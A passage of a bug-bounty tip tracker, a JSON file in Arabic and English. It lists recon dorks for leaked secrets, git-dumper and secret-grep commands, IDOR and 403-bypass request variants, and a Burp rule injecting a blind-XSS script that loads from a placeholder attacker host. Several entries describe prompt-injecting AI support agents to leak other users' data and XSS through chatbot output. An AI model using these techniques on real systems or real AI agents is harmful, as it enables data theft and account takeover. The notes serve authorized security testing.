@@ -1,0 +1,902 @@
+[
+  {
+    "Title": ".DS_Store + Thumbs.db exposure → directory structure leak",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "ملفات macOS/Windows hidden بتتساب على السيرفر. .DS_Store بيكشف أسماء الملفات والمجلدات، Thumbs.db نفس الفكرة. مفيد جداً لما تلاقي directory listing مقفول.",
+    "Payload / Code": "https://target.com/.DS_Store\nhttps://target.com/Thumbs.db\n# استخدم dsstore parser بعد التحميل",
+    "Source": "Classic overlooked recon (still pays when combined with sensitive paths)"
+  },
+  {
+    "Title": ".git/config exposed → full source dump with git-dumper ($500–$3500+ real cases)",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "كشف .git/config قد يسمح باستنتاج إعدادات أو يؤكد أن مسارًا من مستودع Git مكشوف، لكنه لا يثبت تلقائيًا إمكانية سحب المستودع كاملًا أو وجود أسرار صالحة. ابدأ بطلب قراءة محدود وغير حساس، ثم وثّق الأثر دون استخراج تاريخ كامل أو استخدام أي credentials مكتشفة.",
+    "Payload / Code": "curl -I https://target.com/.git/config\ngit-dumper https://target.com/.git/ ./dump\ncd dump && git log -p | grep -iE 'password|secret|api_key|token'",
+    "Source": "Multiple 2025 writeups: Ibtissam $3500, Syed €1000, Abhi Sharma $500, Sudarshana RCE chain"
+  },
+  {
+    "Title": ".htpasswd / .htaccess exposed → Basic Auth credentials",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "لو .htpasswd مكشوف، تقدر تعمل crack للـ hashes وتدخل على الـ protected areas.",
+    "Payload / Code": "https://target.com/.htpasswd\nhttps://target.com/.htaccess",
+    "Source": "Classic misconfig"
+  },
+  {
+    "Title": ".svn/wc.db exposed → full source code reconstruction ($400 case)",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "جرب /.svn/wc.db. لو موجود، حمله واستخدم sqlite3 عشان تستخرج الـ pristine paths وتبني الـ source كامل (زي .git).",
+    "Payload / Code": "wget https://target.com/.svn/wc.db\nsqlite3 wc.db 'select local_relpath from NODES;'",
+    "Source": "Vipul Sahu Medium writeup ($400)"
+  },
+  {
+    "Title": "200 OK is not proof of BOLA",
+    "Category": "[\"IDOR\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "الـstatus code لوحده مش finding. لازم تثبت إن response رجّع object مختلف أو إن state اتغيّر فعلاً. قارن body/headers/length، وبعدها اعمل verification من مالك object في حساب تاني تملكه.",
+    "Payload / Code": "Use a harmless canary value in a lab and verify it from the second controlled account. Treat redirects, generic success JSON, and identical empty bodies as inconclusive.",
+    "Source": "https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/access-controls"
+  },
+  {
+    "Title": "403/401 Bypass — Path Normalization & Parser Differential",
+    "Category": "[\"WAF Bypass\",\"Auth Bypass\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": null,
+    "Payload / Code": null,
+    "Source": "Professor the Hunter — 20 Oct 2025"
+  },
+  {
+    "Title": "403/401 host → archive.org old snapshots still have secrets",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "لما تلاقي host بيرجع 401/403 أو basic auth، روح لـ archive.org وشوف الـ historical snapshots. أحيانًا الـ old versions فيها API keys أو unprotected content لسه موجود.",
+    "Payload / Code": "https://web.archive.org/web//https://locked-host.target.com/",
+    "Source": "Book of BugBounty Tips + multiple hunters"
+  },
+  {
+    "Title": "404 response → check for exposed config or repository paths",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "صفحة 404 عادية قد تساعد في ملاحظة سلوك routing غير متوقع، لكنها لا تعني أن الملفات بجوارها موجودة. اختبر المسارات الشائعة على أصل الموقع فقط وداخل النطاق، وسجّل status code وحجم الاستجابة ومحتواها. لا تفترض أن حالة المكافأة المذكورة قابلة للتعميم.",
+    "Payload / Code": "https://target.com/some/404/path/.git/config\nhttps://target.com/some/404/path/.env",
+    "Source": "InfoSec Write-ups — الرابط الأصلي يحتاج إضافة للتحقق من الحالة المذكورة"
+  },
+  {
+    "Title": "404 Subdomains — Backend errors, S3 paths, and leaked stack info",
+    "Category": "[\"Recon\",\"Subdomain Enum\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "Subdomains that return 404 are often ignored. Hitting a non-existent path on those hosts can still surface backend error pages, stack traces, internal paths, S3 references, or dev leftovers that never appear on the main site.",
+    "Payload / Code": "1) Enumerate subs → httpx\n2) Keep hosts with interesting 404/500 behavior\n3) Probe: /random404, /nonexistent, /.env, /debug\n4) Review body for stack traces, bucket URLs, internal hostnames\n\nExample idea:\nhttps://test.api.target.com/random404",
+    "Source": "Hatem Aliyan — Bug Bounty Tip (404 pages)"
+  },
+  {
+    "Title": "Advanced Dork: .env with real secrets (DB_PASSWORD / AWS_SECRET)",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "ابحث عن .env اللي فيه علامات secrets حقيقية مش مجرد أسماء. دي بتجيب نتائج عالية الجودة.",
+    "Payload / Code": "site:target.com (ext:env OR inurl:.env) (\"DB_PASSWORD\" OR \"AWS_SECRET_ACCESS_KEY\" OR \"SECRET_KEY\" OR \"APP_KEY\")",
+    "Source": "dorksearch.com + multiple 2025-2026 guides"
+  },
+  {
+    "Title": "Advanced Dork: .git exposure with HEAD/config",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "ده dork لاكتشاف صفحات قد تشير إلى كشف .git، لكنه يعتمد على فهرسة محركات البحث وقد يرجع نتائج قديمة أو نتائج غير مؤكدة. افتح النتيجة يدويًا داخل نطاق البرنامج، وتحقق من إمكانية قراءة ملف غير حساس مثل HEAD. لا تعتبر مجرد ظهور المسار إثباتًا لكشف المستودع.",
+    "Payload / Code": "site:target.com inurl:.git (\"HEAD\" OR \"config\" OR \"index of\")",
+    "Source": "dorksearch.com + Proviesec + real cases"
+  },
+  {
+    "Title": "Advanced Dork: Backup files with credentials",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "الـ dork قد يجد ملفات backup مفهرسة، لكن نتائج البحث قد تكون قديمة أو أمثلة أو خارج النطاق. تحقق من وجود الملف واستجابة الخادم دون تنزيل dumps أو أسرار. أضف رابط مصدر محدد يثبت الطريقة بدل الاكتفاء بعبارة multiple guides.",
+    "Payload / Code": "site:target.com (ext:bak OR ext:old OR ext:backup OR ext:~ OR ext:swp) (password OR secret OR key OR db_)",
+    "Source": "Undercode + multiple guides"
+  },
+  {
+    "Title": "Advanced Dork: Firebase / S3 public buckets",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب buckets و Firebase المفتوحة المرتبطة بالـ target.",
+    "Payload / Code": "site:s3.amazonaws.com \"target.com\" OR site:firebaseio.com \"target\" OR site:storage.googleapis.com \"target\"",
+    "Source": "OSINT 2026 guides"
+  },
+  {
+    "Title": "Advanced Dork: Open directory listings with sensitive folders",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب index of اللي فيها backup أو config أو private.",
+    "Payload / Code": "site:target.com intitle:\"index of\" (backup OR config OR private OR admin OR .env OR .git)",
+    "Source": "Classic still effective 2026"
+  },
+  {
+    "Title": "Advanced Dork: Private keys & certificates",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب ملفات الـ private keys المكشوفة.",
+    "Payload / Code": "site:target.com (\"BEGIN RSA PRIVATE KEY\" OR \"BEGIN PRIVATE KEY\" OR \"BEGIN OPENSSH PRIVATE KEY\" OR \"BEGIN CERTIFICATE\")",
+    "Source": "dorksearch.com + OSINT guides"
+  },
+  {
+    "Title": "Advanced Dork: SQL dumps with real data",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيركز على dumps اللي فيها INSERT أو CREATE TABLE عشان تبقى data حقيقية مش أمثلة.",
+    "Payload / Code": "site:target.com filetype:sql (\"INSERT INTO\" OR \"CREATE TABLE\") (password OR email OR credit)",
+    "Source": "Hacklido + Medium 2025-2026"
+  },
+  {
+    "Title": "Advanced Dork: Swagger / OpenAPI / GraphQL docs",
+    "Category": "[\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب الـ API documentation المكشوفة اللي بتسهل الـ IDOR و auth bypass.",
+    "Payload / Code": "site:target.com (inurl:swagger OR inurl:openapi OR inurl:api-docs OR inurl:graphql) (\"swagger\" OR \"openapi\" OR \"__schema\")",
+    "Source": "API fuzzing guides + real findings"
+  },
+  {
+    "Title": "AI Builder Project Visibility Regression → Source / Chat History Authorization Boundary",
+    "Category": "[\"Recon\",\"General\"]",
+    "Rating": "📌 للمراجعة",
+    "Status": "Not started",
+    "How It Works": "Official historical evidence: Lovable reported and fixed a regression that exposed public-project chat history/source to other authenticated users with a project link. This supports the general authorization-boundary test idea, but does not establish a currently exploitable bug on Lovable or another product. Since this test needs two controlled accounts/projects and a current in-scope product, keep it as a review lead until a current candidate is independently verified.",
+    "Payload / Code": "For an explicitly in-scope AI builder or collaboration SaaS, compare permissions between the published app URL, project/editor URL, remix/share links, version history, generated source, and prompt/chat history using two accounts you control. Check whether an ordinary user can access project metadata or conversation history belonging to the second test account. Do not guess private links or access real customers' projects. Avoid retesting the disclosed Lovable regression unless the program explicitly requests verification.",
+    "Source": "Lovable official incident response (reported fixed) ; Escape research methodology on vibe-coded apps"
+  },
+  {
+    "Title": "AI Chat / Support Agent — conversationID / session UUID BOLA (unauthenticated or cross-user)",
+    "Category": "[\"IDOR\",\"API Hacking\",\"Auth Bypass\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "AI assistants and support agents assign conversation or session UUIDs. GraphQL/REST resolvers frequently skip ownership and even authentication checks on history/read endpoints. Swap the conversationID (from URL, body, or WebSocket) with another user's; also test completely unauthenticated. Leaks private prompts, PII, booking details, or internal tool actions. Low competition surface in 2026.",
+    "Payload / Code": "POST /graphql\n{\"query\":\"query { papayaConversationHistory(conversationID: \"victim-uuid\") { messages } }\"}\n\nOr REST:\nGET /api/chat/history?conversationId=victim-uuid\n(without auth header)",
+    "Source": "Twitter/X @Bug_Breakdown + @dd_pwnd — unauthenticated GraphQL IDOR on AI chat history + support agents as attack surface (Nov 2026)"
+  },
+  {
+    "Title": "AI support agents as attack surface (IDOR / BAC / XSS)",
+    "Category": "[\"IDOR\",\"Auth Bypass\",\"XSS\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "Companies replace human support with LLM agents that can look up accounts, change details, and issue refunds. Same bug classes with new names: agent shows another user's data = IDOR; agent does admin actions for a normal user = broken access control; unescaped agent output on a page = XSS. Start from OWASP Top 10 for LLM Apps. Prefer two test accounts and clear evidence. Do not auto-confirm from chat text alone.",
+    "Payload / Code": "Map support/chat/agent endpoints\nPrompt injection to request other-user data (authorized tests only)\nCompare agent actions with and without session\nCheck reflected agent HTML sinks",
+    "Source": "Twitter/X @dd_pwnd — support chat is part of the attack surface (Nov 2026); ~$50k reports mentioned with low competition"
+  },
+  {
+    "Title": "AI support chatbot that renders model output in DOM → XSS → session theft / ATO",
+    "Category": "[\"XSS\",\"Auth Bypass\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "شركات كثيرة تضيف chatbot دعم بدون تدقيق مخرجات النموذج. لو البوت يفك payload (base64/URL-decode) ويعرض الناتج في DOM بدون sanitization، تحصل على XSS مخزّن أو منعكس عبر قناة المحادثة. سلسلة شائعة: XSS → سرقة cookies/tokens أو OAuth cookie-downgrade → account takeover. القاعدة: أي مخرجات LLM تُرسَم في الصفحة = سطح هجوم. اختبر على برامج مصرّح بها فقط، بأدلة (request/response + DOM proof) من غير إضرار بالمستخدمين.",
+    "Payload / Code": "1) Find in-scope AI/chat/support endpoints\n2) Send encoded XSS (base64, HTML entities, markdown that becomes HTML)\n3) Confirm bot decodes and DOM reflects/executes\n4) Escalate only with proof: cookie access, token leak, or auth action in same origin\nHeuristic: \"If it renders in the DOM, treat it as injectable until proven sanitized.\"",
+    "Source": "Patrickbatman writeup tip (X) — AI bot decoded base64 XSS into DOM"
+  },
+  {
+    "Title": "Amazon Cognito misconfig → Account Takeover",
+    "Category": "[\"Auth Bypass\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "لو الـ User Pool misconfigured (مثلاً allow unauthenticated or weak identity pool)، تقدر تعمل ATO أو escalate privileges.",
+    "Payload / Code": "دور على Cognito User Pool ID في الـ JS / config",
+    "Source": "Intigriti archived writeup (iknowhatodo)"
+  },
+  {
+    "Title": "Angular HttpClient — URL parsing discrepancy may leak XSRF tokens",
+    "Category": "[\"CSRF\",\"Fuzzing\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "Angular's HTTP client had an XSRF token leakage issue related to a URL-parsing discrepancy, described as an incomplete fix for CVE-2025-66035. The useful testing pattern is to compare how the framework classifies a request URL against how the browser/network layer resolves the final destination; token attachment must follow the intended same-origin policy.",
+    "Payload / Code": "In a local app using an affected Angular version, test only controlled same-origin and cross-origin URLs and observe whether the XSRF header is attached to a request that resolves cross-origin. Use a dummy token and a local receiver; do not collect real anti-CSRF tokens from production users. Read the advisory for affected/fixed versions and upgrade guidance.",
+    "Source": "Official Angular Advisory GHSA-jfgx-762w-99vr (2026-10-16): https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr"
+  },
+  {
+    "Title": "Apache server-status / server-info مكشوف → internal info + active requests",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "/server-status بيرجع active connections، request URLs، client IPs. /server-info بيكشف modules و configuration. مفيد للـ recon العميق.",
+    "Payload / Code": "https://target.com/server-status\nhttps://target.com/server-info\nhttps://target.com/server-status?auto",
+    "Source": "Common misconfig still found in 2025-2026"
+  },
+  {
+    "Title": "API Debug /env /status endpoints → $3,000 Bounty (Secret Hunter case)",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "كثير APIs بتسيب /debug أو /env أو /_debug أو /health مع verbose mode. بيرجع environment variables كاملة. استخدم ffuf بقائمة debug endpoints.",
+    "Payload / Code": "ffuf -u https://target.com/api/FUZZ -w debug_endpoints.txt -mc 200\n# قائمة: debug, env, status, health, _debug, actuator/env",
+    "Source": "Undercode Testing writeup – $3,000 paid"
+  },
+  {
+    "Title": "API: جرّب تغيير نوع قيمة الـ UUID لـ ID أو Email",
+    "Category": "[\"API Hacking\",\"IDOR\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "لما endpoint بيقبل UUID كـ identifier، جرّب تبعتله ID رقمي أو إيميل بدل الـ UUID. بعض الباكيندات بتعمل CASE على أكتر من نوع identifier في نفس الاستعلام، وده ممكن يفتح مسارات وصول تانية.",
+    "Payload / Code": "/api/user/a8ae-1322-ac09-8f90\n/api/user/1\n/api/user/user@a.test\n\nSQL موازي محتمل في الباكيند:\nSELECT * FROM subscribers WHERE\n  CASE\n    WHEN $1 > 0 THEN id = $1\n    WHEN $2 != '' THEN uuid = $2::UUID\n    WHEN $3 != '' THEN email = $3\n  END;",
+    "Source": "Anton @thercem an"
+  },
+  {
+    "Title": "Array / parameter pollution on ID (user_id[]=1&user_id[]=2)",
+    "Category": "[\"IDOR\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بعض الـ backends بياخدوا أول أو آخر قيمة، أو بيعملوا array. جرب [] أو تكرار الباراميتر.",
+    "Payload / Code": "user_id[]=victim&user_id[]=attacker\nid=1&id=2",
+    "Source": "Classic still works"
+  },
+  {
+    "Title": "Array injection ([] or [1,2,3]) → Full Path / Stack Trace Disclosure",
+    "Category": "[\"Recon\",\"General\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "حط array في أي parameter (حتى لو مش متوقع). كتير من الـ frameworks بترمي error فيها full path أو stack trace أو internal class names. مفيد جدًا لـ path disclosure وخطأ oracle.",
+    "Payload / Code": "param[]=1\nparam[1,2,3]=test\nparam[][]=1",
+    "Source": "Book of Bug Bounty Tips + multiple hunters"
+  },
+  {
+    "Title": "Array-form IDOR — id[]=attacker&id[]=victim bypass",
+    "Category": "[\"IDOR\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "ACL sometimes checks a single scalar id. Sending the same parameter as an array (id[]= or id as JSON array) can make the backend iterate and return or act on a second ID without ownership checks. Compare single-id 403 vs array 200 on authorized test objects only.",
+    "Payload / Code": "id=attacker_id  → 403\nid[]=attacker_id&id[]=victim_id  → 200?\nid=[attacker_id, victim_id]  (JSON)\nAlso: ids=1,2 or objects[0][id]=victim",
+    "Source": "Twitter/X IDOR edge-case tips (array/list parameters) + 2026 hunting notes"
+  },
+  {
+    "Title": "Authorization path parser differential — encoded semicolon, slash, and backslash",
+    "Category": "[\"Auth Bypass\",\"Fuzzing\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "A security layer and a resource handler may normalize or decode path components differently. Quarkus documented path-based authorization bypass conditions involving encoded semicolons (%3B) and encoded slashes (%2F) or backslashes (%5C), depending on the protected resource and affected version. The reusable primitive is to compare the path representation used by the policy engine with the final handler/resource selected.",
+    "Payload / Code": "Only in an authorized lab or explicitly in-scope target, start with a known protected test route and a negative control. Change one representation at a time: encoded semicolon, encoded slash, or encoded backslash. Compare policy decision, resolved route, and actual access. Do not treat a 200 response alone as proof; confirm protected content or a state change without exposing real data. Check affected versions and vendor fixes before testing.",
+    "Source": "Official Quarkus advisory GHSA-qcxp-gm7m-4j5v / CVE-2026-50559: https://github.com/advisories/GHSA-qcxp-gm7m-4j5v"
+  },
+  {
+    "Title": "Authorization test: swap the target, not the session",
+    "Category": "[\"IDOR\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "في أي request authenticated، افصل بين هوية الـsession وبين object ID الموجود في الـpath/body. جرّب نفس session مع object تاني تملكه أنت. الهدف إثبات إن السيرفر بيربط القرار بالـsubject الصحيح، مش بمجرد إن المستخدم logged in.",
+    "Payload / Code": "Safe lab idea: Account A session + Account B test object ID. Change only a harmless field such as nickname. Confirm the change from Account B.",
+    "Source": "https://portswigger.net/web-security/access-control/idor"
+  },
+  {
+    "Title": "Autorize — أتمتة صيد IDOR / Broken Access Control",
+    "Category": "[\"IDOR\",\"Auth Bypass\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بدل ما تختبر كل endpoint يدوي للـ access control، Autorize بياخد كوكيز مستخدم أقل صلاحية وبيعيد تلقائيًا كل ريكوست بتعمله وانت متصفح بحساب أعلى، وبيقولك لو الـ endpoint اتفتح بصلاحية أقل (Bypassed). نص اكتشافات الـ IDOR بتيجي من تشغيله في الخلفية أثناء التصفح العادي.",
+    "Payload / Code": "1) سجّل حسابين: low-priv (victim cookies تتحط في Autorize) + high-priv تتصفح بيه\n2) حط cookies حساب الـ low-priv في Autorize\n3) اتصفح كل فيتشرز الحساب العالي صلاحية عادي\n4) Autorize بيعيد كل ريكوست بالكوكيز الأقل صلاحية ويقارن الرد (Enforced/Bypassed!)",
+    "Source": "Autorize (Burp Extension) — HackByNight Real World Guide 2025"
+  },
+  {
+    "Title": "AWS App Recon Chain → Cognito Identifiers, S3 / DNS / Deployment Artifact Exposure ($10K Case)",
+    "Category": "[\"Recon\",\"General\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "A 2025 Medium writeup reports a $10,000 bounty for an AWS configuration issue found while reviewing app client code and auth/file-management traffic. A Cognito pool identifier led to correlation of publicly readable cloud resources and deployment artifacts, exposing S3, DNS ranges and infrastructure metadata. The writeup says the researcher used passive discovery and read-only checks; payout is self-reported. The value is the correlation chain, not treating a public identifier as a secret.",
+    "Payload / Code": "On in-scope assets only: inspect public JS/config and observed auth/file flows for AWS region, Cognito User Pool or Identity Pool identifiers, bucket names, API base URLs and deployment references. Follow only resources linked from the authorized target and verify access with minimal read-only requests. Do not enumerate unrelated buckets, download sensitive artifacts, authenticate with discovered credentials, or modify cloud resources. Report the exact exposed resource and data category with redacted evidence.",
+    "Source": "https://medium.com/%40ethan_hunt/how-i-won-10k-by-finding-an-aws-misconfiguration-in-an-app-and-what-you-can-learn-990ee90b4f05 ; https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html ; https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html"
+  },
+  {
+    "Title": "AWS tip: probe /ramp_core.js for embedded AccessKey material",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بعض تطبيقات/SDK قديمة أو حزم front-end تضع مسارات ثابتة فيها مفاتيح أو config. إضافة /ramp_core.js (ومسارات مشابهة من wordlists السحابية) لمرحلة content discovery قد تكشف AccessKeyId/Secret في JS. المفتاح وحده يحتاج إثبات صلاحية وتأثير داخل النطاق قبل البلاغ.",
+    "Payload / Code": "Add to content wordlist:\n/ramp_core.js\n/.aws/credentials\n/config.json\n/aws-config.js\nAfter hit: extract AKIA… patterns; verify only with program-allowed checks; never use keys outside authorized testing.",
+    "Source": "Mr_mars_hacker AWS tip (X)"
+  },
+  {
+    "Title": "Azure Application Gateway v2 — 403 Query String Extension Bypass (Unverified)",
+    "Category": "[\"WAF Bypass\"]",
+    "Rating": "📌 للمراجعة",
+    "Status": "Not started",
+    "How It Works": "Reported observation from an X post: a restricted URL returns HTTP 403, but adding a query parameter whose value contains the literal string .js (example: ?x=.js) reportedly changes the response and may allow access to the resource. The author suspects a Microsoft Azure Application Gateway v2 filtering/parsing behavior and says the cause is still being investigated. This is an unverified hypothesis, not a confirmed general bypass. Possible class to investigate: disagreement between gateway/WAF URL inspection and downstream application or routing interpretation of the query string.",
+    "Payload / Code": "Baseline: https://authorized-target.example/restricted-path\nComparison variant: https://authorized-target.example/restricted-path?x=.js\n\nOnly replace the placeholder with a target explicitly in scope. Compare status, redirect chain, response headers, body length/hash, and whether the actual protected resource is returned. Do not treat HTTP 200 alone as proof; check for a block page, login page, or generic error.",
+    "Source": "https://x.com/GodfatherOrwa/status/2114030843077259297"
+  },
+  {
+    "Title": "Azure DevOps Public Project Review → Pipeline Metadata & Accidental Secret Exposure",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "Public Azure DevOps projects and repository/build surfaces may expose pipeline YAML, build logs, test outputs, artifacts, deployment configuration, or identifiers that reveal how a target deploys. The highest-signal angle is accidental disclosure inside an artifact or log (for example, a credential accidentally printed in a failed build), not simply finding a public project. This is distinct from GitHub Actions workflow injection already covered in Notion. Public-project visibility can be intentional, and program policies differ sharply.",
+    "Payload / Code": "Passive-first, in-scope workflow: identify the organization's official Azure DevOps tenant from public references; inspect only publicly accessible project/repository/build pages and artifacts; review pipeline YAML, recent failed-build logs, test reports, coverage output, and downloadable build artifacts for secrets or private deployment data. Do not guess or access private project IDs, use stolen credentials, trigger builds, or test credentials against live services. If a suspected secret appears, capture a redacted proof and report it; do not use it.",
+    "Source": "https://www.microsoft.com/en-us/msrc/bounty-azure-devops ; https://microsoft.github.io/zerotrustassessment/docs/workshop-guidance/devsecops/DS_076 ; https://bugbounty.info/Attack-Surface/CI-CD/Secret-Leakage"
+  },
+  {
+    "Title": "Backup Disclosure عبر فزّ امتداد tar.gz على الدومين الرئيسي",
+    "Category": "[\"Recon\",\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Done",
+    "How It Works": "فزّ الدومين الرئيسي (مش subdomain فرعي) بامتداد أرشيف شائع زي tar.gz بدل الوقوف عند .env أو .git بس. نسخة احتياطية كاملة لإعدادات التطبيق ممكن تتسرب فيها بيانات اعتماد قاعدة البيانات ومفاتيح المصادقة والأسرار كاملة. الدرس: نفس فكرة ملفات الباك اب المنسية (.env, .git, .svn/wc.db) بس بامتداد مختلف وعلى نطاق أساسي بدل فرعي.",
+    "Payload / Code": "fuzz: main-domain.com/FUZZ with extension .tar.gz\n(جرّب كمان .zip .rar .bak .old على نفس الدومين الرئيسي)",
+    "Source": "Kanhaiya Sharma (@krishnsec) — Standoff Bug Bounty, 12 Oct 2025, بونتي موثّق (8,081 views)"
+  },
+  {
+    "Title": "Backup files (wp-config.php.bak, .env.bak, .sql, ~ files) → credentials leak",
+    "Category": "[\"Recon\"]",
+    "Rating": "📌 للمراجعة",
+    "Status": "Not started",
+    "How It Works": "اكتشاف أسماء ملفات backup مفيد، لكن ليس كل ملف يحتوي credentials ولا كل كشف قابل للدفع. استخدم wordlist على الأصول المصرح بها بمعدل منخفض، وتحقق من نوع الملف ومحتواه بأقل دليل ممكن دون تحميل قواعد بيانات أو استخدام أسرار.",
+    "Payload / Code": "ffuf -u https://target.com/FUZZ -w backup_wordlist.txt\n# أمثلة: wp-config.php.bak, .env.bak, backup.sql, database.sql",
+    "Source": "Intigriti WordPress guide + Burp labs + common practice"
+  },
+  {
+    "Title": "Backup tar.gz / .zip / .sql على الـ root domain مباشرة",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "مش بس على subdomains. جرب الامتدادات الشائعة على الدومين الرئيسي نفسه: /backup.tar.gz, /db.sql, /site.zip, /backup.zip, /.env.bak. كتير من الـ misconfigs بتحصل على الـ root.",
+    "Payload / Code": "ffuf -w backups.txt -u https://target.com/FUZZ -e .tar.gz,.zip,.sql,.bak,.old",
+    "Source": "Multiple real bounties + Kanhaiya Sharma style writeups"
+  },
+  {
+    "Title": "Basic Auth cancel spam — intermittent auth bypass on some panels",
+    "Category": "[\"Auth Bypass\"]",
+    "Rating": "📌 للمراجعة",
+    "Status": "Not started",
+    "How It Works": "في بعض لوحات login القديمة، إلغاء نافذة Basic Auth عدة مرات قد يُسقط الجلسة إلى حالة authenticated أو يكشف محتوى محمي بسبب خطأ في منطق التحدي. نادر وغير مضمون؛ وثّق بدقة إن نجح ولا تعتمد عليه كمنهج أساسي.",
+    "Payload / Code": "Open protected path → browser Basic Auth prompt → Cancel 3–4 times → observe whether body/admin UI leaks.\nPrefer reproducing with raw HTTP (empty Authorization / repeated 401 handling) for a clean PoC.",
+    "Source": "mahmoud tip (X) — cancel basic auth 3–4 times"
+  },
+  {
+    "Title": "Blind SSRF Detection عبر Interactsh",
+    "Category": "[\"SSRF\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "لو الـ SSRF مش بترجع أي رد في الـ response (blind)، استخدم سيرفر out-of-band زي Interactsh للتأكد من وجود الثغرة عبر أي DNS/HTTP callback يوصلك.",
+    "Payload / Code": "1) تنصيب: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n2) تشغيل: interactsh-client -server oast.pro -n 5\n3) حط الـ subdomain اللي طلعتلك مكان الـ URL المستهدف في الـ request\n4) أي callback يرجع = تأكيد وجود الثغرة",
+    "Source": "Redfox Security 2026"
+  },
+  {
+    "Title": "Blind XSS أوتوماتيكي عبر Match & Replace في Burp",
+    "Category": "[\"XSS\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بدل ما تدور يدوي على أماكن الحقن المحتملة، اعمل match & replace rule في الـ proxy (Burp) يحقن الـ Blind XSS payload بتاعك أوتوماتيكيًا في كل ريكووست بتبعته وانت بتتصفح عادي. لو الـ payload اتنفذ في admin panel أو dashboard داخلي، هتوصلك إشعار على سيرفر الـ XSS Hunter/interactsh بتاعك.",
+    "Payload / Code": "في Burp: Proxy > Match and Replace\nMatch: rn (أي header)\nReplace: rn<blind-xss-header>: \"><script src=https://YOUR-XSS-HUNTER-URL></script>rn\n\nأو أضف الـ payload في كل قيمة param بتمر عليها أثناء التصفح العادي",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 1)"
+  },
+  {
+    "Title": "BOLA / IDOR via Batch & Bulk ID Mixing",
+    "Category": "[\"IDOR\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "Many APIs expose batch/bulk endpoints that accept arrays of object IDs (ids[], JSON array of objects, /api/batch). Authorization is often checked only on the first ID or skipped per-item. Mix your own IDs with a victim ID in the same request; also try duplicate keys, partial-failure responses that leak existence, and array stuffing. If the server processes the victim object, you have scalable BOLA.",
+    "Payload / Code": "POST /api/batch\n{\"ids\": [\"your-id\", \"victim-id\"]}\n\nor\nids[]=your-id&ids[]=victim-id\n\nor mixed objects:\n[{\"id\":\"your-id\"}, {\"id\":\"victim-id\"}]",
+    "Source": "Twitter/X @yogsec — BOLA via Batch/Bulk Request ID Mixing (Nov 2026)"
+  },
+  {
+    "Title": "BOLA via Wildcard / Special ID Values (*, all, 0, -1, null, empty)",
+    "Category": "[\"IDOR\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
